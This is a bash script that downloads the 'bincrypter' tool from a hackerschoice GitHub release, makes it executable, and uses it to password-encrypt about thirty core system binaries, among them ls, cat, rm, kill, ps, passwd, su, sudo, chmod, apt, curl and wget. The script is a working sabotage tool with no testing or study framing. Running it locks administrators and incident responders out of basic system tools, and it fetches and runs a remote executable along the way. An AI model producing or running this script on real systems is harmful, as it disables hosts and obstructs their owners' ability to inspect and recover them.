#!/usr/bin/env bash
# encrypt-bins.sh
# Usage: ./encrypt-bins.sh [password]
# You may override SEARCH_DIRS by exporting it before running:
#   SEARCH_DIRS="/usr/local/bin:/usr/bin:/bin" ./encrypt-bins.sh mypass

set -euo pipefail

BINCRYPTER_URL="https://github.com/hackerschoice/bincrypter/releases/latest/download/bincrypter"
BINCRYPTER_LOCAL="./bincrypter"

# Default search directories (environment). Edit or override with SEARCH_DIRS env var.
SEARCH_DIRS="${SEARCH_DIRS:-/usr/bin:/bin}"

# list of binaries to encrypt (as requested)
LIST_BINARY=(
cd
curl
wget
pkill
kill
killall
xargs
mount
remount
echo
ps
aux
passwd
ls
rm
cp
mv
touch
rmdir
find
stat
cat
less
nano
vi
su
sudo
chmod
chown
apt
sed
)

# get password from first arg or prompt
if [ "${1:-}" != "" ]; then
  PASSWORD="$1"
else
  read -s -p "Enter encryption password: " PASSWORD
  echo
  if [ -z "$PASSWORD" ]; then
    echo "No password provided. Exiting."
    exit 1
  fi
fi

# ensure curl or wget exists for download
download_bincrypter() {
  echo "Downloading bincrypter..."
  if command -v curl >/dev/null 2>&1; then
    curl -SsfL "$BINCRYPTER_URL" -o "$BINCRYPTER_LOCAL" || { echo "curl download failed"; return 1; }
  elif command -v wget >/dev/null 2>&1; then
    wget -qO "$BINCRYPTER_LOCAL" "$BINCRYPTER_URL" || { echo "wget download failed"; return 1; }
  else
    echo "Neither curl nor wget found. Install one and retry."
    return 1
  fi
  chmod +x "$BINCRYPTER_LOCAL"
  echo "Downloaded and made executable: $BINCRYPTER_LOCAL"
  return 0
}

# Check bincrypter existence
if [ ! -x "$BINCRYPTER_LOCAL" ]; then
  if ! download_bincrypter; then
    echo "Failed to obtain bincrypter. Exiting."
    exit 2
  fi
else
  echo "Found existing $BINCRYPTER_LOCAL (executable)."
fi

# helper: resolve binary path
resolve_binary() {
  local name="$1"
  # try command -v first
  if BIN_PATH="$(command -v -- "$name" 2>/dev/null || true)"; then
    if [ -n "$BIN_PATH" ] && [ -x "$BIN_PATH" ]; then
      printf '%s' "$BIN_PATH"
      return 0
    fi
  fi

  # try searching SEARCH_DIRS
  IFS=':' read -r -a dirs <<< "$SEARCH_DIRS"
  for d in "${dirs[@]}"; do
    # skip empty
    [ -z "$d" ] && continue
    local candidate="$d/$name"
    if [ -x "$candidate" ]; then
      printf '%s' "$candidate"
      return 0
    fi
  done

  # not found
  return 1
}

# Prevent accidental encrypting of the local bincrypter file itself
BINCRYPTER_ABS="$(readlink -f "$BINCRYPTER_LOCAL" 2>/dev/null || true)"

echo "Using search dirs: $SEARCH_DIRS"
echo "Encrypting list: ${LIST_BINARY[*]}"

for b in "${LIST_BINARY[@]}"; do
  # trim whitespace (defensive)
  b="$(printf '%s' "$b" | tr -d '\r\n' | xargs)"
  if [ -z "$b" ]; then
    continue
  fi

  if ! BIN_PATH="$(resolve_binary "$b")"; then
    echo "Skipping '$b' — not found in PATH or SEARCH_DIRS."
    continue
  fi

  # do not encrypt our downloader
  if [ -n "$BINCRYPTER_ABS" ] && [ "$BIN_PATH" = "$BINCRYPTER_ABS" ]; then
    echo "Skipping '$b' -> resolved to bincrypter itself ($BIN_PATH)."
    continue
  fi

  echo "Encrypting: $BIN_PATH"
  if "$BINCRYPTER_LOCAL" "$BIN_PATH" "$PASSWORD"; then
    echo " -> Success: $BIN_PATH"
  else
    echo " -> Failed to encrypt $BIN_PATH"
  fi
done

echo "Done."
